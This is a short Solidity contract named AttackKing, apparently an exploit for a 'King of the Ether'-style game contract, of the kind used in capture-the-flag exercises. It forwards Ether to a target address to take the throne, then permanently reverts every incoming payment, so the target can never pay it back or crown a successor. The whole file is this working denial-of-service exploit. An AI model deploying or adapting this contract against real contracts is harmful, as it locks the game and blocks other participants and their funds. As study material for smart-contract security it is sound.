// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackKing {
    function claimThrone(address _addr) external payable {
        (bool s,) = payable(_addr).call{value: msg.value}("");
        require(s, "!Sent");
    }

    receive() external payable {
        require(false, "Can't overthrow me!");
    }
}
